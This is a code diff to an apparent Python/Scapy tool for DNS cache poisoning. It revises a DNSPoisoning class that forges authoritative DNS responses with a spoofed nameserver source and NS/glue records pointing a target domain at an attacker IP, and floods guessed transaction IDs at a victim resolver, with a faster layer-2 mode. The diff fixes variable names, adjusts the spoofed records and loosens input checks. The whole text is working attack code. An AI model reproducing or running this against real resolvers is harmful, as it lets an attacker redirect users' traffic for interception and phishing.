@@ -34,6 +34,12 @@ class DNSPoisoning:
         ## Authoritative Poisoning
         DAN = 2
 
+    ##
+    #   Raised when an invalid MAC address is provided
+    class InvalidMAC(Exception):
+        pass
+
+
 
     ##  Constructor
     #
@@ -46,8 +52,9 @@ class DNSPoisoning:
     #   @param ttl              The TTL value to put into the relative DNS field. (Default 30000)
     #   @param victim_mac       The victim server MAC address (Only needed for "faster flood" mode).
     #   @param nic_interface    The Network Card Interface to use (Reccomended on "faster flood" mode)
-    #   @param interrupt_handler    The function that handle the CTRL+C signal    
-    #   @param blessing_terminal    The instance of the blessing terminal (optional)
+    #
+    #
+    #    @param interrupt_handler    The function that handle the CTRL+C signal    
     #   @param log              The function used to print messages
     #
     #
@@ -73,7 +80,11 @@ class DNSPoisoning:
         self.source_port = sport
 
         self.flood_pool = None
-        self.flood_socket = socket
+
+        if socket is not None:
+            self.flood_socket = socket
+        else:
+            self.open_socket()
 
         ## Specify the attack type to perform
         self.attack_type = attack_type
@@ -110,6 +121,8 @@ class DNSPoisoning:
     #   Set Victim MAC address. This option is only required in "faster flooding" mode.
     #
     def set_victim_mac(self, victim_mac):
+        if victim_mac is None:
+            raise self.InvalidMAC
         self.victim_mac = victim_mac
 
     ##
@@ -128,8 +141,8 @@ class DNSPoisoning:
     #   @brief Set the attck type
     #   @param attack_type (DNSPoisoning.AttackType) Specify the type of attack to perform
     def set_attack_type(self, attack_type):
-        if attack_type not in set(a_type.value for a_type in self.AttackType):
-            return False
+        #if attack_type not in set(a_type.value for a_type in self.AttackType):
+        #    return False
         
         self.attack_type = attack_type
         return True
@@ -143,7 +156,12 @@ class DNSPoisoning:
     def open_socket(self):
         if self.flood_socket != None:
             self.flood_socket.close()
-        self.flood_socket = conf.L3socket(iface=self.nic_interface)
+
+        if self.nic_interface is None:
+            self.flood_socket = conf.L3socket()   
+        else:
+            #Open on the specified network interface
+            self.flood_socket = conf.L3socket(iface=self.nic_interface)
 
     ## Create Socket
     #
@@ -203,7 +221,7 @@ class DNSPoisoning:
         if ID is None:
             ID = self.id
 
-        dan_crafted_response = IP(dst=self.victim_server, src=self.auth_nameserver)\
+        dan_crafted_response = Ether()/IP(dst=self.victim_server, src=self.auth_nameserver)\
             /UDP(dport=self.source_port, sport=53)\
                 /DNS(id=ID,\
                     qr=1,\
@@ -211,16 +229,16 @@ class DNSPoisoning:
                     ra=1,\
                     aa=1,\
                     qd=DNSQR(qname=self.random_url, qtype="A", qclass='IN'),\
-                    ar=DNSRR(rrname='ns.' + self.spoofed_domain, type='A', rclass='IN', ttl=self.ttl, rdata=self.attacker_ip)/DNSRR(rrname=self.spoofed_domain, type='A', rclass='IN', ttl=self.ttl, rdata=self.attacker_ip),\
+                    ar=DNSRR(rrname='ns.' + self.spoofed_domain, type='A', rclass='IN', ttl=self.ttl, rdata=self.attacker_ip)/DNSRR(rrname=self.random_url, type='A', rclass='IN', ttl=self.ttl, rdata=self.attacker_ip),\
                     ns=DNSRR(rrname=self.spoofed_domain, type='NS', rclass='IN', ttl=self.ttl, rdata='ns.' + self.spoofed_domain)\
                 )
 
         
         if victim_mac is not None:
             # Use layer 2 packets
-            crafted_response[Ether].dst=self.victim_mac 
+            dan_crafted_response[Ether].dst=self.victim_mac 
 
-        return crafted_response
+        return dan_crafted_response
 
     ## Faster Flooding Mode
     #   @brief Send Crafted Packet via Ethernet packets 
@@ -261,7 +279,6 @@ class DNSPoisoning:
         # Ask the query to the random url
         query = Ether(dst=victim_mac)/IP(dst=self.victim_server)/UDP(dport=53, sport=self.sport)/DNS(id=random.randint(10,1000), rd=1,qd=DNSQR(qname=self.random_url))
         pkts.append(query)
-
 
         for ID in guess_range:
 
